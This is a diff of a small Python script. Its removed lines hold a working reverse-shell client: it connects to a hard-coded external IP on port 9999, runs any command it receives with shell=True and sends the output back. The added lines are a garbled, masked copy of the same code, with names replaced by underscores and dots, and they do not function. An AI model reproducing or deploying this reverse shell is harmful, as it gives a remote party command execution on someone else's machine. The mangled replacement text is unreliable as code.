@@ -1,23 +1,23 @@
-import socket
-import os
-import subprocess
+______ so..
+______ __
+______ su..
 
-s = socket.socket()
-host = '104.236.209.167'
-port = 9999
+s _ ?.?
+host _ '104.236.209.167'
+port _ 9999
 
-s.connect((host, port))
+s.c..((host, port))
 
-while True:
-    data = s.recv(1024)
-    if data[:2].decode("utf-8") == 'cd':
-        os.chdir(data[3:].decode("utf-8"))
+w__ T..:
+    data _ s.r..(1024)
+    __ data[:2].d..("utf-8") __ 'cd':
+        __.chdir(data[3:].d..("utf-8"))
 
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
+    __ le.(data) > 0:
+        cmd _ ?.Popen(data[:].d..("utf-8"),shell_T.., s_o.._?.PIPE, stdin_?.PIPE, s_e.._?.PIPE)
+        output_byte _ cmd.s_o...r.. + cmd.s_e...r..
+        output_str _ st.(output_byte,"utf-8")
+        currentWD _ __.getcwd + "> "
+        s.s..(st..en..(output_str + currentWD))
 
         print(output_str)
